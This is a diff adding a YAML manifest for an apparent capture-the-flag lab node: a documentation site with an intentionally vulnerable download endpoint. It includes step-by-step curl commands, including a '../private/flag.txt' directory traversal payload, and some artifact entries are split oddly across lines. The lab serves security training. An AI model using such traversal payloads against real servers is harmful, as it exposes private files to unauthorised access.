@@ -1,0 +1,83 @@
+manifest_version: 1
+id: '55'
+kind: flag-node-generator
+name: 'HTTP: Directory Traversal Docs'
+description: Documentation library with a vulnerable download endpoint that can reach
+  private notes.
+hint_template: Exercise the docs download endpoint before moving to {{NEXT_NODE_NAME}}.
+runtime:
+  type: docker-compose
+  compose_file: docker-compose.yml
+  service: generator
+env:
+  WEB_VARIANT_ID: http_directory_traversal_docs
+inputs:
+- name: seed
+  type: string
+  required: true
+- name: node_name
+  type: string
+  required: true
+- name: flag_prefix
+  type: string
+  required: false
+- name: web_port
+  type: number
+  required: false
+  default: 8080
+artifacts:
+  requires:
+  - Knowledge(ip)
+  produces:
+  - Flag(flag_id)
+  - FlagDelivery(mode)
+  - FlagFile(path)
+  - File(path)
+  - PortForward(host
+  - port)
+  - Directory(host
+  - path)
+  - Endpoint(path)
+  - Version(service)
+  - Vulnerability(host
+  - type)
+injects:
+- site
+inject_candidate_paths:
+- /var/www/docs
+- /srv/docs-library
+- /opt/kb/public
+- /home/www-data/docs
+access_instructions:
+  title: Directory Traversal in HTTP Docs
+  steps:
+  - step: 1
+    title: Fetch a normal document
+    instructions: '```bash
+
+      curl ''http://{{NODE}}:{{PORT}}/download?file=network-baseline.txt''
+
+      ```
+
+      '
+  - step: 2
+    title: Traverse to a private file
+    instructions: '```bash
+
+      curl ''http://{{NODE}}:{{PORT}}/download?file=../private/flag.txt''
+
+      ```
+
+      '
+  - step: 3
+    title: Record the private note
+    instructions: Record the flag recovered via traversal.
+hint_levels:
+  low:
+  - Exercise the docs download endpoint before moving to {{NEXT_NODE_NAME}}.
+  medium:
+  - 'File/artifact: {{OUTPUT.File(path):basename}}'
+  high:
+  - Fetch a normal document
+  - Traverse to a private file
+  - 'Record the private note: Record the flag recovered via traversal.'
